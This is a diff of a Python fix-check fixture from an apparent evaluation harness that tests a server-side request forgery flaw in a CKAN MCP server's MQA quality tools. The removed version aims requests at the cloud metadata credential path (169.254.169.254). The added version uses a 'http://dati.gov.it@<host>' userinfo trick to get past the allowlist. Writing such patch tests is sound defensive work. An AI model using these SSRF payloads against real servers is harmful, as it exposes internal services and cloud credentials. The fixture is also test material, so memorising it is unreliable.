@@ -1,15 +1,15 @@
 """@aborruso/ckan-mcp-server fix-check fixture: CVE-2026-73845 (SSRF, CWE-918).
 
-The MQA quality tools (ckan_get_mqa_quality and ckan_get_mqa_quality_details) start from a CKAN
-package fetched through the caller-supplied server_url, which in the affected range (< 0.4.112, the
-0.4.108 vulnerable build) is requested with no destination check and its body echoed into the
-error, so a link-local server_url is fetched and the sentinel nonce surfaces: reach =
-internal_fetch. Either tool surfacing counts, so both carry an exploit. 0.4.112 validates
-server_url and rejects a private / link-local host before any fetch, so no nonce surfaces.
+The MQA tools (ckan_get_mqa_quality and ckan_get_mqa_quality_details) fetch
+`${server_url}/api/3/action/package_show` for their caller-supplied server_url. In the affected
+range (0.4.108, the vulnerable build) an allowlist bypass of the form `http://dati.gov.it@<host>`
+(the portal name as userinfo) passes the portal check yet resolves to <host>, so the sentinel is
+fetched and its nonce surfaces: reach = internal_fetch. 0.4.112 parses the host past the userinfo
+and rejects it, so no nonce surfaces. Either MQA tool surfacing counts; both are counted tools, so
+both are exercised.
 
-The benign CKAN call reaching the live responder is a run-time concern recorded in the admission,
-not a fix-check one, so this fixture stands only the kit ssrf_env sentinel and carries no benign
-call.
+The benign MQA call reaching the live responder is a run-time concern recorded in the admission, not
+a fix-check one, so this fixture stands only the kit ssrf_env sentinel and carries no benign call.
 """
 
 import re
@@ -21,41 +21,34 @@ from evals.holdout_kit.fix_check import FixCheckTarget
 from evals.holdout_kit.kit_client import KitClient
 from evals.holdout_kit.kit_launch import ssrf_env
 
+_HOST = "203.0.113.5"
+
 WITNESS = Place(
-    id="ckan-73845-imds",
+    id="ckan-73845-sentinel",
     family="fix_check",
     reachable_by=frozenset({"internal_fetch"}),
     kind=PlantKind.HTTP_ENDPOINT,
-    coordinates=Coordinates(
-        PlantKind.HTTP_ENDPOINT,
-        host="169.254.169.254",
-        path="/latest/meta-data/iam/security-credentials/",
-    ),
+    coordinates=Coordinates(PlantKind.HTTP_ENDPOINT, host=_HOST, path="/api/3/action/package_show"),
 )
-# An exploit is aimed when its server_url carries an internal / link-local address; the benign
-# public-portal call (a run-time concern) does not match.
-AIM = re.compile(r"://(?:10\.|127\.|169\.254\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)")
-HOST = PlantingHost(SymbolicUser.UNPRIVILEGED, "/srv", has_network=True)
+AIM = re.compile(re.escape(_HOST))
+HOST = PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=True)
 
 
-def _ssrf_base_url(places: Places) -> str:
-    # Terminate server_url with `?` so the appended `/api/3/action/<action>` becomes a query string
-    # the sentinel ignores, leaving the request path equal to the planted coordinate.
-    coordinates = places[WITNESS.id].coordinates
-    return f"http://{coordinates.host}{coordinates.path}?"
+def _bypass_url(places: Places) -> str:
+    # The portal name as userinfo passes the allowlist yet resolves to the sentinel host.
+    return f"http://dati.gov.it@{places[WITNESS.id].coordinates.host}"
 
 
-async def _exploit_get_mqa_quality(places: Places, client: KitClient) -> None:
+async def _exploit_mqa_quality(places: Places, client: KitClient) -> None:
     await client.call_tool(
-        "ckan_get_mqa_quality",
-        {"server_url": _ssrf_base_url(places), "identifier": "demo-dataset"},
+        "ckan_get_mqa_quality", {"server_url": _bypass_url(places), "dataset_id": "whatever"}
     )
 
 
-async def _exploit_get_mqa_quality_details(places: Places, client: KitClient) -> None:
+async def _exploit_mqa_quality_details(places: Places, client: KitClient) -> None:
     await client.call_tool(
         "ckan_get_mqa_quality_details",
-        {"server_url": _ssrf_base_url(places), "identifier": "demo-dataset"},
+        {"server_url": _bypass_url(places), "dataset_id": "whatever"},
     )
 
 
@@ -66,7 +59,7 @@ TARGET = FixCheckTarget(
     witness=WITNESS,
     planting_host=HOST,
     builder=ssrf_env,
-    exploits=(_exploit_get_mqa_quality, _exploit_get_mqa_quality_details),
+    exploits=(_exploit_mqa_quality, _exploit_mqa_quality_details),
     benign_calls=(),
     vulnerable_service="ckan-vuln",
     patched_service="ckan",
